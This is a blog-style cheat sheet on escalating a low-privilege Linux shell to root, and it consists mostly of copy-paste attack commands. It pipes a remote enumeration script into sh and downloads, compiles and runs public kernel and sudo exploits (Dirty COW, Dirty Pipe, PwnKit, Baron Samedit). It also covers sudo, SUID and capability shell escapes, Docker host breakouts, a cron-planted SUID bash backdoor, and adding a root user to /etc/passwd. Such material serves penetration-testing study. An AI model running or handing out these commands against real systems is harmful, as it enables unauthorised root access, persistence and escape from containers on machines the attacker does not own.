---
layout: post
title: "Linux Privilege Escalation Cheat Sheet"
category: "Privilege Escalation"
date: 2025-11-18
readTime: "15 min"
tags: [linux, privesc, kernel, docker, suid]
excerpt: "Got a low-priv shell? Here's how to escalate to root. No theory, just techniques that actually work."
---

# Linux Privilege Escalation Cheat Sheet

You popped a shell as `www-data` or some random user. Cool, but you need root. Here's how to get there.

## Start with Enumeration

Don't guess. Enumerate properly:

```bash
# Quick automated enum
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual checks
whoami && id
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
```

LinPEAS will highlight potential vectors. Follow the colors.

## Sudo Misconfigurations

Check what you can run as root:

```bash
sudo -l
```

If you see **NOPASSWD** on any binary, check [GTFOBins](https://gtfobins.github.io/).

Common wins:

```bash
# find
sudo find . -exec /bin/sh \; -quit

# vim
sudo vim -c ':!/bin/sh'

# python
sudo python -c 'import os; os.system("/bin/sh")'

# less
sudo less /etc/passwd
!sh
```

### Sudo CVE-2021-3156 (Baron Samedit)

If sudo < 1.9.5p2:

```bash
wget https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/hax.c
gcc hax.c -o hax
./hax
```

Instant root if vulnerable.

## SUID Binaries

SUID files run with owner's permissions. If owned by root, you can abuse them.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Look for weird custom binaries or standard tools in odd places.

### Common SUID Exploits

```bash
# python
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# php
php -r "system('/bin/bash -p');"

# find
find . -exec /bin/sh -p \; -quit

# nano (if SUID - read/write as root)
nano /etc/sudoers
```

Check GTFOBins for the binary you find.

## Linux Capabilities

Capabilities are like sudo permissions but per-file.

```bash
getcap -r / 2>/dev/null
```

If you see `cap_setuid+ep` on any binary = game over.

```bash
# python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl
/usr/bin/perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
```

## Kernel Exploits

Nuclear option. Can crash the box, so use as last resort.

```bash
uname -a  # Check kernel version
```

### Dirty COW (< 4.8.3)

```bash
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
su firefart  # password: dirtycowfun
```

### Dirty Pipe (5.8 - 5.16.11)

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
gcc exploit-1.c -o exploit
./exploit
```

### PwnKit (2021)

```bash
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
chmod +x PwnKit
./PwnKit
```

## Docker Escapes

Inside a container? Time to break out.

### Check if You're in Docker

```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
```

### Privileged Container

```bash
# Test if privileged
ip link add dummy0 type dummy

# If it works, mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

You're now root on the host.

### Docker Socket Mounted

```bash
ls -la /var/run/docker.sock

# If exists
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Instant root shell on host.

## Cron Jobs

Cron jobs run as root. Find writable scripts.

```bash
cat /etc/crontab
ls -la /etc/cron.* 
```

If you find a writable script:

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/script.sh
```

Wait for cron to run, then:

```bash
/tmp/rootbash -p
```

## Writable /etc/passwd

If `/etc/passwd` is writable (rare but happens):

```bash
# Generate password hash
openssl passwd -1 -salt evil yourpassword

# Add new root user
echo 'hacker:$1$evil$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch
su hacker
```

## PATH Hijacking

If a SUID binary calls a command without full path:

```bash
# Example: binary calls "ls" instead of "/bin/ls"
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH

# Run the SUID binary
/path/to/suid-binary
```

It'll execute your fake `ls` which spawns a root shell.

## Escalation Priority

1. **Sudo permissions** - Easiest and safest
2. **SUID binaries** - Common vector
3. **Capabilities** - Often overlooked
4. **Cron jobs** - Reliable if you find one
5. **Docker escapes** - If in container
6. **Kernel exploits** - Last resort (can crash system)

## Quick Wins Checklist

```bash
# 1. Sudo
sudo -l

# 2. SUID
find / -perm -4000 2>/dev/null

# 3. Capabilities
getcap -r / 2>/dev/null

# 4. Cron
cat /etc/crontab

# 5. Writable files
find / -writable -type f 2>/dev/null | grep -v proc

# 6. Kernel version
uname -a
searchsploit "linux kernel $(uname -r)"
```

## Resources

- [GTFOBins](https://gtfobins.github.io/) - SUID/sudo exploitation
- [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) - Comprehensive guide
- [LinPEAS](https://github.com/carlospolop/PEASS-ng) - Best enum script

That's the playbook. Happy hunting.
